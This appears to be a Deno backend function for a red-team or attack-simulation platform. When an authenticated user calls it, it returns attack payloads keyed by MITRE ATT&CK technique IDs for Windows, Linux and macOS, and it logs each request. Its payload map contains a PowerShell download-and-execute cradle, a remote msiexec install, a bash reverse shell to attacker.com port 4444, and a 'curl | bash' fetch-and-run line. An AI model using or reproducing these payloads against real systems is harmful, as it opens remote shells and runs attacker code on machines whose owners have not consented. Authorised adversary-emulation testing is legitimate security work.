import { createClientFromRequest } from 'npm:@base44/sdk@0.8.6';

Deno.serve(async (req) => {
  try {
    const api = createClientFromRequest(req);
    const user = await api.auth.me();

    if (!user) {
      return Response.json({ error: 'Unauthorized' }, { status: 401 });
    }

    const body = await req.json();
    const { device_id, device_type, vulnerability } = body;

    if (!device_id || !device_type || !vulnerability) {
      return Response.json({
        error: 'Missing required parameters: device_id, device_type, vulnerability'
      }, { status: 400 });
    }

    // Generate payload based on device type and vulnerability
    const payloadMap = {
      windows: {
        'T1059.001': 'powershell -Command "IEX(New-Object Net.WebClient).DownloadString(\'http://attacker.com/ps1\')"',
        'T1566.002': 'msiexec /i http://attacker.com/payload.msi',
        'T1204.001': 'explorer.exe C:\\Temp\\payload.exe'
      },
      linux: {
        'T1059.004': 'bash -i >& /dev/tcp/attacker.com/4444 0>&1',
        'T1566.002': 'curl http://attacker.com/payload.sh | bash',
        'T1204.001': '/tmp/payload && chmod +x /tmp/payload && /tmp/payload'
      },
      macos: {
        'T1059.004': 'bash -i >& /dev/tcp/attacker.com/4444 0>&1',
        'T1566.002': 'curl http://attacker.com/payload.sh | bash',
        'T1204.001': '/var/tmp/payload && chmod +x /var/tmp/payload && /var/tmp/payload'
      }
    };

    // Get base payload or generate default
    let payload = payloadMap[device_type]?.[vulnerability] || 
      `# Payload for ${device_type} - ${vulnerability}\necho "Generated payload for ${device_type}"`;

    // Create audit record
    await api.entities.AuditLog.create({
      action: 'payload_generated',
      actor: user.email,
      actor_role: user.role,
      resource_type: 'system',
      resource_name: `Payload for ${device_id}`,
      details: `Generated payload for ${device_type} targeting ${vulnerability}`,
      success: true
    });

    return Response.json({
      status: 'success',
      device_id: device_id,
      device_type: device_type,
      vulnerability: vulnerability,
      payload: payload,
      message: 'Payload generated successfully'
    });
  } catch (error) {
    return Response.json({ error: error.message }, { status: 500 });
  }
});